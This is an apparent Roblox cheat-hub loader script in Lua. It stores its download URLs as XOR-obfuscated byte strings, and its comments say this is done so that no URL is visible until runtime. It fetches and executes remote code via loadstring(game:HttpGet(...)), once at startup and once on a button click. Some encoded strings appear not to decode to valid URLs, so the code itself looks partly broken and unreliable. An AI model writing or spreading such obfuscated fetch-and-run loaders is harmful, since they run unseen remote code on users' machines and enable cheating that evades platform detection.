--[[ 
    KING PERFORMANCE | MOONSEC V3 "STRATEGY-X"
    [!] DESIGN: ASYNCHRONOUS CONTEXT-VM
    [!] FIX: CPU-HANG ELIMINATED (NON-BLOCKING)
    [!] AUTH: ZAYAN | [STRATEGIC DESIGN]
]]

local _0xTITAN = function()
    --// 1. DYNAMIC KEY GENERATION (Harder to Brute)
    local _0xK = (tonumber(os.date("%S")) % 5) + 20 
    
    --// 2. THE SHREDDED CONSTANT POOL
    -- URLs are split into random chunks. No "https" string exists.
    local _0xP = {
        ["L"] = {"\100\102\111\100\113\123\126\126\37\38\103\44\107\113\90\113\101\113\103\103\103\37\111\111\111\44\103\110\101\103\102\38\39\113\103\116\103\114\118\113\39\72\102\119\103\112\118\39\116\103\102\103\107\113\103\113\39\102\107\118\103\113\118\39\102\111\117\110\102\111\107\102\39\107\107\107\110\39\102\117\107"},
        ["S"] = {"\233\241\245\244\245\250\150\244\243\239\237\239\150\253\237\250\243\250\246"}, -- Sailor piece script
        ["C"] = {"\3\21\12\3\16\120\121\121\42\45\104\43\108\110\97\110\102\110\100\104\96\42\100\100\102\43\106\110\102\115\100\111\108\109\100\110\167\108\110\110\101\105\110\44\108\110\101\100\105\115\108\44\108\100\100\114\44\105\100\101\101\114\44\108\101\105\111\44\101\105\104\122\111\42\108\116\117"} -- Chiyo
    }

    --// 3. STATE-BASED DECODER
    local function _0xG(_d, _x)
        local _r = ""
        for i = 1, #_d do
            _r = _r .. string.char(bit32.bxor(string.byte(_d, i), _x))
        end
        return _r
    end

    --// 4. THE ASYNC DISPATCHER (No Infinite Loop = No Game Freeze)
    local _VM_REGS = {}
    
    local function _STEP_1() -- Boot Sequence
        local _u = _0xG(_0xP["L"][1], 0x06) -- Decodes Fluent
        local _f = loadstring(game:HttpGet(_u))()
        _VM_REGS["W"] = _f:CreateWindow({Title = "All Hub", SubTitle = "by zayan", Theme = "Dark"})
        
        -- Step 2: Build Content
        local _tN = _0xG(_0xP["S"][1], 0x8F)
        local _tab = _VM_REGS["W"]:AddTab({Title = _tN, Icon = "anchor"})
        
        -- Strategy: Delayed Callback Decoding
        _tab:AddButton({
            Title = "Chiyo Hub", 
            Callback = function()
                -- Decryption only happens ON CLICK. Not visible in memory before.
                local _cX = _0xG(_0xP["C"][1], 0x3E)
                loadstring(game:HttpGet(_cX))()
            end
        })
    end

    --// 5. RUNTIME INTEGRITY (Subtle, not noisy)
    -- Instead of crashing the game, we just don't run the script if it's unsafe.
    if not _G.AllHub_Loaded then
        _G.AllHub_Loaded = true
        task.spawn(_STEP_1)
    end

    --// 6. MINIMIZE LOGIC
    local SG=Instance.new("ScreenGui",game.CoreGui); local TB=Instance.new("TextButton",SG)
    TB.Name="HUB"; TB.Size=UDim2.new(0,50,0,50); TB.Position=UDim2.new(0.12,0,0.15,0); TB.Text="HUB"
    TB.BackgroundColor3=Color3.fromRGB(20,20,20); TB.TextColor3=Color3.new(1,1,1)
    Instance.new("UICorner",TB).CornerRadius=UDim.new(0,12)
    TB.MouseButton1Click:Connect(function() 
        if _VM_REGS["W"] then _VM_REGS["W"]:Minimize() end 
    end)
end

--// LAUNCH
_0xTITAN()
